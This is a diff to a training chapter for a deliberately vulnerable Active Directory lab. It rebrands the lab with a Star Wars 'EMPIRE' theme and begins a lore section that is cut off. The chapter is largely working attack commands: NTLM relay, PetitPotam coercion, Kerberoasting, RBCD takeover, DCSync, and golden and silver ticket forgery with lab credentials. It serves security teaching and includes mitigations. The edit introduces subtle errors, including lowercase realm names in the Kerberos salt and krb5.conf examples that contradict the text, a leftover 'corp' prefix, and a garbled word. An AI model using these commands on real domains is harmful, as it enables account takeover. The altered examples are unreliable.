@@ -82,7 +82,7 @@ So when we talk about "credentials" in attacks, we usually mean one of:
 
 All of these are "credentials" in the operator sense. Credential access in
 ATT&CK terminology is the category of techniques that obtain them. You
-will spend many hours of DVAD with the **credential triangle** in mind:
+will spend many hours of EMPIRE with the **credential triangle** in mind:
 
 ```
                   +----------------+
@@ -112,7 +112,7 @@ will spend many hours of DVAD with the **credential triangle** in mind:
               Pass-the-ticket
 ```
 
-A great many DVAD flags live somewhere on this triangle. Knowing where you
+A great many EMPIRE flags live somewhere on this triangle. Knowing where you
 sit on it — and what conversions are available — is half the operator's
 mental model.
 
@@ -139,7 +139,7 @@ LM("Password") =
 
 Modern Windows disables LM hash storage by default (`NoLMHash=1`), but some
 legacy auth flows still compute it ephemerally. Confirm via
-`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\NoLMHash`. In DVAD, no user has
+`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\NoLMHash`. In EMPIRE, no user has
 a stored LM hash, so secretsdump output for the LM column is always
 `aad3b435b51404eeaad3b435b51404ee` — the well-known **empty-LM** constant
 for blank input. Memorise that byte string; in a real engagement, seeing it
@@ -160,7 +160,7 @@ for NTLM auth and as the RC4 Kerberos key.
 ```
 python3 -c '
 import hashlib, sys
-pw="Password1!"
+pw="SithLord1!!"
 print(hashlib.new("md4", pw.encode("utf-16-le")).hexdigest())
 '
 # a4f49c406510bdcab6824ee7c30fd852
@@ -285,7 +285,7 @@ You collect this on the wire. You **cannot replay** it (challenge is
 server-chosen) but you can crack offline. The Responder dump format is:
 
 ```
-peter.parker::CORP:1122334455667788:5b8b34...:01010000...
+peter.parker::EMPIRE:1122334455667788:5b8b34...:01010000...
        ^^^^   ^^^^^^^^^^^^^^^^ ^^^^^^^   ^^^^^^^^
        domain server-challenge ntproof   blob
 ```
@@ -294,11 +294,11 @@ Hashcat mode 5600 is NetNTLMv2:
 
 ```
 hashcat -m 5600 hashes.txt rockyou.txt
-hashcat -m 5600 hashes.txt -a 3 'DVAD?d?d?d?d!'      # mask attack
+hashcat -m 5600 hashes.txt -a 3 'EMPIRE?d?d?d?d!'      # mask attack
 ```
 
-NetNTLMv2 is what Responder and ntlmrelayx dump. DVAD users have weak
-passwords by design (`DVADlab2024!`, `Summer2024!`, `Welcome1`), so cracking
+NetNTLMv2 is what Responder and ntlmrelayx dump. EMPIRE users have weak
+passwords by design (`EmpireLab2024!`, `Summer2024!`, `Welcome1`), so cracking
 is feasible against rockyou with light rules.
 
 ### What's in target_info (AV_PAIRS)
@@ -342,7 +342,7 @@ The attacker uses the victim's challenge to drive a fresh session against
 `target`, then takes over after auth succeeds. Important constraints:
 
 - **Signing must not be required on the target.** SMB signing required →
-  relay fails. LDAP signing required → relay fails. DVAD disables both
+  relay fails. LDAP signing required → relay fails. EMPIRE disables both
   signing requirements deliberately (the GPO `Microsoft network server:
   Digitally sign communications (always) = Disabled` and the registry
   values `LDAPServerIntegrity = 1`).
@@ -360,22 +360,22 @@ ntlmrelayx is the canonical tool. Targets:
 ntlmrelayx.py -tf targets.txt -smb2support
 
 # LDAPS -> grant RBCD on target computer to attacker-owned computer
-ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access \
+ntlmrelayx.py -t ldaps://coruscant.empire.local --delegate-access \
               --escalate-user loki -smb2support
 
 # HTTP -> ADCS web enrollment (ESC8) — request cert as victim
-ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
+ntlmrelayx.py -t http://endor.empire.local/certsrv/certfnsh.asp \
               --adcs --template DomainController -smb2support
 
 # SMB -> LDAP, add shadow credential on target
-ntlmrelayx.py -t ldap://dc01.corp.local --shadow-credentials \
-              --shadow-target 'DC01$' -smb2support
+ntlmrelayx.py -t ldap://coruscant.empire.local --shadow-credentials \
+              --shadow-target 'coruscant$' -smb2support
 
 # Relay -> dump LSA secrets (if relayed as admin)
-ntlmrelayx.py -t smb://server01.corp.local --secrets-dump
+ntlmrelayx.py -t smb://server01.empire.local --secrets-dump
 ```
 
-DVAD IA-012, CRED-031, CRED-032 are textbook relay scenarios.
+EMPIRE IA-012, CRED-031, CRED-032 are textbook relay scenarios.
 
 ### The coercion problem
 
@@ -398,12 +398,12 @@ Running PetitPotam:
 
 ```bash
 # Force DC to authenticate to our IP via EfsRpcOpenFileRaw
-python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' -d corp.local \
-        attacker-ip dc01.corp.local
+python3 PetitPotam.py -u peter.parker -p 'EmpireLab2024!' -d empire.local \
+        attacker-ip coruscant.empire.local
 ```
 
-The DC machine account `DC01$` opens an SMB connection to attacker-ip and
-NTLM-authenticates. ntlmrelayx forwards that to `ldaps://dc02.corp.local`
+The DC machine account `coruscant$` opens an SMB connection to attacker-ip and
+NTLM-authenticates. ntlmrelayx forwards that to `ldaps://dc02.empire.local`
 with `--delegate-access` to drop RBCD on DC02, and you've taken over.
 
 ### Mitigations stack
@@ -457,26 +457,26 @@ Kerberos's threat model assumes:
   (Silver Ticket).
 - The client and server have synchronised clocks within a small window.
 
-DVAD breaks every assumption in turn.
+EMPIRE breaks every assumption in turn.
 
 ---
 
 ## 5.6 (Mechanics) Kerberos cast of characters
 
-- **Client / Principal** — the user (`peter.parker@CORP.LOCAL`). Realm names are
+- **Client / Principal** — the user (`peter.parker@empire.local`). Realm names are
   by convention uppercase versions of the DNS domain.
 - **KDC (Key Distribution Center)** — the DC. Composed of two services:
   - **AS (Authentication Server)** — issues TGTs.
   - **TGS (Ticket-Granting Service)** — issues service tickets.
-- **Application service** — anything with an SPN (`cifs/file01.corp.local`,
-  `MSSQLSvc/sql01.corp.local:1433`, `HTTP/sharepoint.corp.local`).
+- **Application service** — anything with an SPN (`cifs/scarif.empire.local`,
+  `MSSQLSvc/kamino.empire.local:1433`, `HTTP/sharepoint.empire.local`).
 - **krbtgt** — special account whose key encrypts every TGT.
 - **Service account key** — derived from the service account's password
   (or the computer's machine account password); encrypts the TGS for that
   service.
 - **Inter-realm trust account** — a hidden krbtgt-like account per trust
-  direction, e.g., `krbtgt/FINANCE.LOCAL@CORP.LOCAL` and
-  `krbtgt/CORP.LOCAL@FINANCE.LOCAL`. Each has its own key, set from the
+  direction, e.g., `krbtgt/rebel.local@empire.local` and
+  `krbtgt/empire.local@rebel.local`. Each has its own key, set from the
   trust password.
 
 ```
@@ -512,9 +512,9 @@ AS-REQ from peter.parker -> KDC
     PA-PAC-REQUEST: include-pac=TRUE
   req-body:
     kdc-options: forwardable, renewable, ...
-    cname: peter.parker@CORP.LOCAL
-    realm: CORP.LOCAL
-    sname: krbtgt/CORP.LOCAL
+    cname: peter.parker@empire.local
+    realm: empire.local
+    sname: krbtgt/empire.local
     from:  optional start time
     till:  expiry
     rtime: renew-till
@@ -540,13 +540,13 @@ AS-REP from KDC -> peter.parker
 {
   pvno: 5
   msg-type: AS-REP (11)
-  crealm: CORP.LOCAL
+  crealm: empire.local
   cname: peter.parker
   ticket: TGT
     {
       tkt-vno: 5
-      realm: CORP.LOCAL
-      sname: krbtgt/CORP.LOCAL
+      realm: empire.local
+      sname: krbtgt/empire.local
       enc-part: encrypted with krbtgt key:
         EncTicketPart {
           flags, key (sk1 = session key), crealm, cname,
@@ -633,8 +633,8 @@ TGS-REQ from peter.parker -> KDC
         authenticator: { cname, timestamp } encrypted with sk1
   req-body:
     kdc-options: ...
-    sname: cifs/file01.corp.local
-    realm: CORP.LOCAL
+    sname: cifs/scarif.empire.local
+    realm: empire.local
     till: ...
     nonce: ...
     etype: [...]
@@ -649,14 +649,14 @@ verifies timestamp not stale → issues TGS.
 TGS-REP from KDC -> peter.parker
 {
   msg-type: TGS-REP (13)
-  crealm: CORP.LOCAL
+  crealm: empire.local
   cname: peter.parker
   ticket: TGS
     {
       tkt-vno: 5
-      realm: CORP.LOCAL
-      sname: cifs/file01.corp.local
-      enc-part: encrypted with service account's key (FILE01$):
+      realm: empire.local
+      sname: cifs/scarif.empire.local
+      enc-part: encrypted with service account's key (scarif$):
         EncTicketPart {
           flags, key (sk2), crealm, cname,
           authtime, starttime, endtime, renew-till,
@@ -687,7 +687,7 @@ For AES tickets, the AES256 key is `PBKDF2-HMAC-SHA1(password, salt, 4096)`
 and cracking is PBKDF2-bound. Mode 19700 (TGS-REP AES256). Tooling:
 
 ```
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
         -request -outputfile kerb.hash
 ```
 
@@ -707,15 +707,15 @@ write on `servicePrincipalName`), you can:
 3. Optionally remove the SPN to cover tracks.
 
 ```
-bloodyAD --host dc01 -u peter.parker -p 'DVADlab2024!' \
-         set object 'CN=tony.stark,CN=Users,DC=corp,DC=local' \
-         servicePrincipalName --add cifs/anything.corp.local
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
+bloodyAD --host coruscant -u peter.parker -p 'EmpireLab2024!' \
+         set object 'CN=tony.stark,CN=Users,DC=empire,DC=local' \
+         servicePrincipalName --add cifs/anything.empire.local
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
         -request-user tony.stark -outputfile tony.stark.hash
-bloodyAD ... remove ... cifs/anything.corp.local
+bloodyAD ... remove ... cifs/anything.empire.local
 ```
 
-DVAD CRED-005 is targeted Kerberoast against a user where peter.parker has
+EMPIRE CRED-005 is targeted Kerberoast against a user where peter.parker has
 GenericWrite.
 
 ---
@@ -796,7 +796,7 @@ KERB_VALIDATION_INFO:
   UserFlags
   UserSessionKey
   LogonServer (the issuing DC)
-  LogonDomainName ("CORP")
+  LogonDomainName ("EMPIRE")
   LogonDomainId (the domain SID prefix)
   Reserved...
   UserAccountControl
@@ -805,9 +805,9 @@ KERB_VALIDATION_INFO:
 ```
 
 **ExtraSids is where SID history lives.** When you forge a ticket and want
-cross-forest EA, you stuff `S-1-5-21-FINANCE-519` in ExtraSids. The
+cross-forest EA, you stuff `S-1-5-21-REBEL-519` in ExtraSids. The
 target-domain KDC, on cross-realm referral, then sees that the principal
-"is also" a member of FINANCE Enterprise Admins.
+"is also" a member of REBEL Enterprise Admins.
 
 **The PAC signatures evolution:**
 
@@ -871,7 +871,7 @@ into the PAC for the service to consult without an LDAP round-trip.
 
 ### UPN_DNS_INFO (PAC buffer type 12)
 
-Contains the user's UPN (e.g., `peter.parker@corp.local`) and the DNS domain
+Contains the user's UPN (e.g., `peter.parker@empire.local`) and the DNS domain
 name. This is what PKINIT-issued tickets use to map cert SAN to AD
 identity. When you forge tickets, this buffer must be present and
 consistent for many service endpoints (Exchange, ADFS) to function.
@@ -931,9 +931,9 @@ domain-wide and set the per-account attribute to `0x18` (AES128 + AES256).
 
 For AES, the **salt** matters:
 
-- **User**: `<UPCASE-REALM><principal>` — e.g., `CORP.LOCALalice`
+- **User**: `<UPCASE-REALM><principal>` — e.g., `empire.localalice`
 - **Computer**: `<UPCASE-REALM>host<lowercase-hostname>.<lowercase-realm>`
-  — e.g., `CORP.LOCALhostdc01.corp.local`
+  — e.g., `empire.localhostcoruscant.empire.local`
 - **Service** with sAMAccountName ending in `$`: like a computer.
 
 This means an attacker who renames a service account can break AES key
@@ -950,7 +950,7 @@ python3 -c '
 from impacket.krb5.crypto import string_to_key
 from impacket.krb5.constants import EncryptionTypes
 key = string_to_key(EncryptionTypes.aes256_cts_hmac_sha1_96.value,
-                    b"DVADlab2024!", b"CORP.LOCALalice")
+                    b"EmpireLab2024!", b"empire.localalice")
 print(key.contents.hex())
 '
 ```
@@ -1015,8 +1015,8 @@ service -> KDC:  TGS-REQ
 
 - If you have *any* account with constrained delegation **with protocol
   transition (TrustedToAuthForDelegation)** and a target SPN whitelisted
-  to e.g. `cifs/dc01.corp.local`, you can synthesize a TGS impersonating
-  *anyone* (including Administrator) to `cifs/dc01.corp.local`. Game over.
+  to e.g. `cifs/coruscant.empire.local`, you can synthesize a TGS impersonating
+  *anyone* (including Administrator) to `cifs/coruscant.empire.local`. Game over.
 - Plain S4U2Proxy without protocol transition still requires a forwardable
   TGT from the user — harder but possible if you can coerce them.
 
@@ -1038,61 +1038,61 @@ are the targets.
 ```bash
 # Pre-req: peter.parker has GenericWrite on TARGET$ (Bloodhound finds this)
 # Step 1: create attacker computer (uses MachineAccountQuota=10)
-impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' \
+impacket-addcomputer empire.local/peter.parker:'EmpireLab2024!' \
         -computer-name 'BAD$' -computer-pass 'B4dPass!' \
         -dc-ip 10.10.0.10
 
 # Step 2: set RBCD on TARGET$ to allow BAD$
-impacket-rbcd corp.local/peter.parker:'DVADlab2024!' \
+impacket-rbcd empire.local/peter.parker:'EmpireLab2024!' \
         -delegate-from 'BAD$' -delegate-to 'TARGET$' \
         -action write -dc-ip 10.10.0.10
 
 # Step 3: S4U2Self+S4U2Proxy to get TGS for cifs/target as Administrator
-impacket-getST -spn cifs/target.corp.local \
+impacket-getST -spn cifs/target.empire.local \
         -impersonate Administrator \
-        corp.local/'BAD$':'B4dPass!' -dc-ip 10.10.0.10
+        empire.local/'BAD$':'B4dPass!' -dc-ip 10.10.0.10
 
 # Step 4: use the ticket
-export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
-impacket-psexec -k -no-pass target.corp.local
+export KRB5CCNAME=Administrator@cifs_target.empire.local@empire.local.ccache
+impacket-psexec -k -no-pass target.empire.local
 ```
 
 You're SYSTEM on `target` and you never knew Administrator's password.
-RBCD is the most common DVAD ACL-chain payoff.
+RBCD is the most common EMPIRE ACL-chain payoff.
 
 ---
 
 ## 5.14 (Mechanics) Referrals across trusts
 
-When peter.parker in `corp.local` wants `cifs/server.finance.local`:
+When peter.parker in `empire.local` wants `cifs/server.rebel.local`:
 
 ```
-peter.parker -> CORP KDC: TGS-REQ for cifs/server.finance.local
-                    CORP KDC realises finance.local != CORP, returns a
+peter.parker -> EMPIRE KDC: TGS-REQ for cifs/server.rebel.local
+                    EMPIRE KDC realises rebel.local != EMPIRE, returns a
                     referral TGT encrypted with the inter-realm trust key
-                    krbtgt/FINANCE.LOCAL@CORP.LOCAL
+                    krbtgt/rebel.local@empire.local
 
-peter.parker -> FINANCE KDC: TGS-REQ with the referral TGT as PA-TGS-REQ
-                    FINANCE KDC decrypts with its copy of the trust key
-                    (krbtgt/FINANCE.LOCAL@CORP.LOCAL on FINANCE side),
+peter.parker -> REBEL KDC: TGS-REQ with the referral TGT as PA-TGS-REQ
+                    REBEL KDC decrypts with its copy of the trust key
+                    (krbtgt/rebel.local@empire.local on REBEL side),
                     sees PAC, applies SID filtering policy,
-                    issues TGS for cifs/server.finance.local
+                    issues TGS for cifs/server.rebel.local
 ```
 
-This is where **SID filtering** kicks in: when FINANCE KDC decrypts the
+This is where **SID filtering** kicks in: when REBEL KDC decrypts the
 referral PAC, it inspects ExtraSids and either honors or strips them based
 on `trustAttributes` and the `dwAttributes` bits set when the trust was
 created.
 
-DVAD's `corp.local <-> finance.local` external trust intentionally has
+EMPIRE's `empire.local <-> rebel.local` external trust intentionally has
 SID filtering **disabled** (via `netdom trust /quarantine:no`), allowing
-SID history injection: forge a ticket in CORP with FINANCE's EA SID in
-ExtraSids, present it to FINANCE — KDC honors it. That's `DF-001`.
+SID history injection: forge a ticket in EMPIRE with REBEL's EA SID in
+ExtraSids, present it to REBEL — KDC honors it. That's `DF-001`.
 
 Forest trusts default to SID filtering enabled and only allow SIDs that
 match the trusted forest's domain SID prefixes. Disabling SID filtering on
 a forest trust requires `netdom trust /enablesidhistory:yes` and explicit
-attribute changes. DVAD's `corp.local <-> root.corp` forest trust also has
+attribute changes. EMPIRE's `empire.local <-> trade.corp` forest trust also has
 filtering relaxed to enable `DF-005`.
 
 ---
@@ -1101,7 +1101,7 @@ filtering relaxed to enable `DF-005`.
 
 **FAST (Flexible Authentication Secure Tunneling, RFC 6113)** wraps
 Kerberos exchanges inside an armored tunnel that prevents offline password
-cracking of pre-auth blobs. Modern Windows supports it; deploying it (via
+cracking of pre-auth blobs. Modern Windows supports it; deploy.pying it (via
 the "Kerberos client support for claims, compound authentication and
 Kerberos armoring" GPO) on member computers requires AES support and a
 DFL of 2012+.
@@ -1118,7 +1118,7 @@ When FAST is active:
   service account's key, so kerberoasting from a non-FAST client still
   works.
 
-DVAD does **not** enable FAST. AS-REP roasting and Kerberoasting work
+EMPIRE does **not** enable FAST. AS-REP roasting and Kerberoasting work
 because of it.
 
 ---
@@ -1152,7 +1152,7 @@ an ESC1/ESC8/ESC11/etc. template with an arbitrary
 the user's password has been rotated**, your cert still authenticates —
 until either the cert expires or admins revoke and add to `NTAUTH-CRL`.
 
-DVAD's CRED-022..035 all exploit PKINIT.
+EMPIRE's CRED-022..035 all exploit PKINIT.
 
 ### Recovering NT hash via PKINIT + U2U
 
@@ -1164,7 +1164,7 @@ session key. Inside is `PAC_CREDENTIAL_INFO` with the user's NT hash,
 encrypted with the session key — which you have, so you decrypt:
 
 ```
-certipy auth -pfx peter.parker.pfx -domain corp.local -dc-ip 10.10.0.10
+certipy auth -pfx peter.parker.pfx -domain empire.local -dc-ip 10.10.0.10
 # Output: ... NT hash: a4f49c40...
 ```
 
@@ -1182,7 +1182,7 @@ number. Three modes via `StrongCertificateBindingEnforcement`:
 - 1 = Compatibility (warn but allow weak mapping).
 - 2 = Full (require strong mapping).
 
-DVAD uses mode 1 for the lab so ESC9/ESC10 are exploitable. Production
+EMPIRE uses mode 1 for the lab so ESC9/ESC10 are exploitable. Production
 must be at mode 2 by Feb 2025 (per Microsoft's enforcement timeline).
 
 ---
@@ -1223,7 +1223,7 @@ Plus attributes:
 
 - `msDS-AllowedToDelegateTo` — target SPN list for constrained delegation
   (sits on the *delegating* service account). Multivalued, contains SPN
-  strings like `cifs/target.corp.local`.
+  strings like `cifs/target.empire.local`.
 - `msDS-AllowedToActOnBehalfOfOtherIdentity` — security descriptor whose
   ACL grants principals the right to "act on behalf of this account."
   Sits on the *target* computer. RBCD's home.
@@ -1257,10 +1257,10 @@ A **Golden Ticket workflow** in mimikatz:
 mimikatz # privilege::debug
 mimikatz # lsadump::dcsync /user:krbtgt              # get krbtgt's NT hash
 mimikatz # kerberos::golden /user:Administrator \
-                  /domain:corp.local /sid:S-1-5-21-... \
+                  /domain:empire.local /sid:S-1-5-21-... \
                   /krbtgt:<nt> /id:500 /ptt
 mimikatz # misc::cmd                                # cmd with the ticket
-PS C:\> dir \\dc01.corp.local\C$                   # now SYSTEM on the DC
+PS C:\> dir \\coruscant.empire.local\C$                   # now SYSTEM on the DC
 ```
 
 A **Diamond Ticket** workflow (Rubeus):
@@ -1320,7 +1320,7 @@ sudo chronyd -q 'server 10.10.0.10 iburst'
 sudo rdate -n 10.10.0.10
 ```
 
-A common DVAD beginner failure is "tools work yesterday, fail today" —
+A common EMPIRE beginner failure is "tools work yesterday, fail today" —
 check your clock first. The error from impacket on skew is typically
 `KRB_AP_ERR_SKEW (Clock skew too great)`. From Rubeus,
 `KRB_AP_ERR_SKEW`. From SSPI (Windows-side), error 0x8009030C
@@ -1335,13 +1335,13 @@ location `/tmp/krb5cc_<uid>`. impacket tools read from `KRB5CCNAME`:
 
 ```bash
 export KRB5CCNAME=/tmp/peter.parker.ccache
-impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-getTGT empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 # (writes peter.parker.ccache by default in cwd; rename or set KRB5CCNAME)
 
 klist -c /tmp/peter.parker.ccache       # inspect: which principals, lifetimes
 
-impacket-psexec -k -no-pass dc01.corp.local                # uses KRB5CCNAME
-nxc smb dc01.corp.local --use-kcache                       # NetExec equivalent
+impacket-psexec -k -no-pass coruscant.empire.local                # uses KRB5CCNAME
+nxc smb coruscant.empire.local --use-kcache                       # NetExec equivalent
 ```
 
 On Windows, ccaches live in LSASS; access via `klist`, `Rubeus.exe ptt`,
@@ -1357,7 +1357,7 @@ ticketConverter.py peter.parker.ccache peter.parker.kirbi   # ccache <-> kirbi
 
 ```ini
 [libdefaults]
-    default_realm = CORP.LOCAL
+    default_realm = empire.local
     dns_lookup_kdc = false
     dns_lookup_realm = false
     rdns = false
@@ -1367,30 +1367,30 @@ ticketConverter.py peter.parker.ccache peter.parker.kirbi   # ccache <-> kirbi
     udp_preference_limit = 0
 
 [realms]
-    CORP.LOCAL = {
+    empire.local = {
         kdc = 10.10.0.10
         admin_server = 10.10.0.10
     }
-    FINANCE.LOCAL = {
+    rebel.local = {
         kdc = 10.20.0.10
         admin_server = 10.20.0.10
     }
-    ROOT.CORP = {
+    trade.corp = {
         kdc = 10.30.0.10
         admin_server = 10.30.0.10
     }
 
 [domain_realm]
-    .corp.local = CORP.LOCAL
-    corp.local  = CORP.LOCAL
-    .finance.local = FINANCE.LOCAL
-    finance.local  = FINANCE.LOCAL
-    .root.corp = ROOT.CORP
-    root.corp  = ROOT.CORP
+    .empire.local = empire.local
+    empire.local  = empire.local
+    .rebel.local = rebel.local
+    rebel.local  = rebel.local
+    .trade.corp = trade.corp
+    trade.corp  = trade.corp
 ```
 
 `udp_preference_limit = 0` forces TCP, which avoids the "AS-REP too big
-for UDP" failure with AES tickets (very common in DVAD).
+for UDP" failure with AES tickets (very common in EMPIRE).
 
 ---
 
@@ -1405,7 +1405,7 @@ impacket-describeTicket peter.parker.ccache
 Output (abbreviated):
 
 ```
-[*] Service Ticket: cifs/file01.corp.local@CORP.LOCAL
+[*] Service Ticket: cifs/scarif.empire.local@empire.local
     Encryption: AES256
     Flags: forwardable, renewable, pre_authent
     Auth time: 2025-...
@@ -1416,7 +1416,7 @@ Output (abbreviated):
     PrimaryGroupId: 513
     GroupIds: [513, 1107, 1213, ...]
     UserId: 1106
-    LogonDomainName: CORP
+    LogonDomainName: EMPIRE
     LogonDomainId: S-1-5-21-...
     UserFlags: 0x20
     UserAccountControl: 0x210 (NORMAL_ACCOUNT)
@@ -1474,7 +1474,7 @@ Patch: KB4565351 (August 2020) — DCs reject CFB8 with predictable IVs.
 Enforcement mode (`FullSecureChannelProtection=1`) was activated by
 February 2021's cumulative.
 
-DVAD sets `FullSecureChannelProtection=0` and accepts NRPC with
+EMPIRE sets `FullSecureChannelProtection=0` and accepts NRPC with
 predictable IV to allow ZeroLogon — `PE-021`.
 
 ---
@@ -1486,7 +1486,7 @@ Web servers accepting Kerberos use SPNEGO:
 ```
 Browser request to http://intranet/
 Server -> 401 Unauthorized, WWW-Authenticate: Negotiate
-Browser -> obtains TGS for HTTP/intranet.corp.local
+Browser -> obtains TGS for HTTP/intranet.empire.local
 Browser -> sends Authorization: Negotiate YII... (GSS-API blob)
 Server -> validates AP-REQ in the blob, 200 OK
 ```
@@ -1503,7 +1503,7 @@ Why this matters offensively:
   the lack of channel binding in HTTP-Kerberos. NTLMrelayX and
   KrbRelayUp implement this. Highly DC-specific.
 - **HTTP/* SPN squatting:** if a web service runs as a user with an SPN
-  `HTTP/intranet.corp.local`, that user is Kerberoastable.
+  `HTTP/intranet.empire.local`, that user is Kerberoastable.
 
 ---
 
@@ -1547,7 +1547,7 @@ The PowerShell idiom that bypasses the problem when you have plaintext:
 
 ```powershell
 $cred = New-Object PSCredential 'corp\peter.parker',
-        (ConvertTo-SecureString 'DVADlab2024!' -AsPlainText -Force)
+        (ConvertTo-SecureString 'EmpireLab2024!' -AsPlainText -Force)
 Invoke-Command -ComputerName ServerB -Credential $cred -ScriptBlock { ... }
 # Run this Invoke-Command FROM inside the WinRM session on ServerA
 ```
@@ -1561,27 +1561,27 @@ Invoke-Command -ComputerName ServerB -Credential $cred -ScriptBlock { ... }
 Filter `kerberos`. Run from your attacker box:
 
 ```bash
-impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-getTGT empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 ```
 
 Find the AS-REQ. Identify:
 
 - `cname` (peter.parker).
-- `realm` (CORP.LOCAL).
+- `realm` (empire.local).
 - `etype` (which encryption types peter.parker's client offered).
 - `padata` (the encrypted timestamp).
 - The corresponding AS-REP: `ticket.enc-part` (krbtgt-encrypted) and
   `enc-part` (peter.parker-encrypted, outer).
 
-Now try `impacket-getTGT corp.local/peter.parker -hashes :a4f49c40...` and
+Now try `impacket-getTGT empire.local/peter.parker -hashes :a4f49c40...` and
 observe whether the AS-REQ etype list changes.
 
 ### Exercise 5.B — AS-REP roast
 
-In DVAD, certain users have `DONT_REQ_PREAUTH`. Identify them:
+In EMPIRE, certain users have `DONT_REQ_PREAUTH`. Identify them:
 
 ```bash
-impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetNPUsers empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
         -request
 ```
 
@@ -1598,14 +1598,14 @@ If a user has AES-only preauth disabled (rare), `-request` returns
 ### Exercise 5.C — Kerberoast
 
 ```bash
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
         -request -outputfile kerb.hash
 hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
 ```
 
-`13100` is hashcat's Kerberos TGS-REP RC4 mode. Identify which DVAD
+`13100` is hashcat's Kerberos TGS-REP RC4 mode. Identify which EMPIRE
 service account cracks first. Now try forcing AES with
-`-supplied-realm CORP.LOCAL -request-user svc_iis` and see what changes
+`-supplied-realm empire.local -request-user svc_iis` and see what changes
 in the output format. Crack with mode 19700.
 
 ### Exercise 5.D — Look at the PAC
@@ -1623,37 +1623,37 @@ the PasswordLastSet timestamp.
 ### Exercise 5.E — Cross-forest referral observation
 
 ```bash
-impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-getTGT empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 KRB5CCNAME=peter.parker.ccache impacket-getST \
-        -spn cifs/dc01.finance.local \
+        -spn cifs/yavin4.rebel.local \
         -k -no-pass \
-        corp.local/peter.parker -dc-ip 10.10.0.10
+        empire.local/peter.parker -dc-ip 10.10.0.10
 ```
 
-In Wireshark, watch for two TGS-REPs: one from CORP (the referral) and
-one from FINANCE (the actual service ticket). Identify the
-`krbtgt/FINANCE.LOCAL@CORP.LOCAL` principal in the referral.
+In Wireshark, watch for two TGS-REPs: one from EMPIRE (the referral) and
+one from REBEL (the actual service ticket). Identify the
+`krbtgt/rebel.local@empire.local` principal in the referral.
 
 ### Exercise 5.F — Forge a Silver Ticket
 
-After dumping NTDS in Chapter 10, take `FILE01$`'s hash and forge a
-silver ticket for `cifs/file01.corp.local`:
+After dumping NTDS in Chapter 10, take `scarif$`'s hash and forge a
+silver ticket for `cifs/scarif.empire.local`:
 
 ```bash
 impacket-ticketer \
-        -nthash <FILE01$ hash> \
+        -nthash <scarif$ hash> \
         -domain-sid S-1-5-21-... \
-        -domain corp.local \
-        -spn cifs/file01.corp.local \
+        -domain empire.local \
+        -spn cifs/scarif.empire.local \
         -user-id 500 Administrator
 
 export KRB5CCNAME=Administrator.ccache
-smbclient -k //file01.corp.local/C$
+smbclient -k //scarif.empire.local/C$
 ```
 
 No DC contact required to use the ticket. This is the silent power of
 Silver. Now check the DC's 4769 log — there shouldn't be one for this
-session, only the 4624 on FILE01.
+session, only the 4624 on scarif.
 
 ### Exercise 5.G — Forge a Golden Ticket
 
@@ -1663,12 +1663,12 @@ After DCSync of krbtgt:
 impacket-ticketer \
         -nthash <krbtgt hash> \
         -domain-sid S-1-5-21-... \
-        -domain corp.local \
+        -domain empire.local \
         -user-id 500 Administrator
 # (no -spn => TGT, not TGS)
 
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass dc01.corp.local
+impacket-psexec -k -no-pass coruscant.empire.local
 ```
 
 Now look at the DC's 4769 events: one per service ticket request. The
@@ -1701,10 +1701,10 @@ Set your attacker box's clock 10 minutes off:
 
 ```bash
 sudo date -s "$(date -d '10 min ago')"
-impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-getTGT empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 # Should fail: KRB_AP_ERR_SKEW
 sudo ntpdate 10.10.0.10
-impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-getTGT empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 # Should succeed.
 ```
 
@@ -1718,7 +1718,7 @@ This 15-minute exercise saves hours of "why doesn't it work" debugging.
 2. What's the difference between an NT hash (stored) and a NetNTLMv2
    (over the wire)?
 3. Why is NTLM relay possible at the protocol level?
-4. What two SMB signing options matter for relay, and which one does DVAD
+4. What two SMB signing options matter for relay, and which one does EMPIRE
    disable?
 5. What does the "krbtgt" account do, and what would happen if you reset
    its password twice?
@@ -1775,3 +1775,85 @@ This 15-minute exercise saves hours of "why doesn't it work" debugging.
 - **Microsoft — KB5014754** — Strong certificate binding.
 
 Next: [06-pki-and-adcs.md](06-pki-and-adcs.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
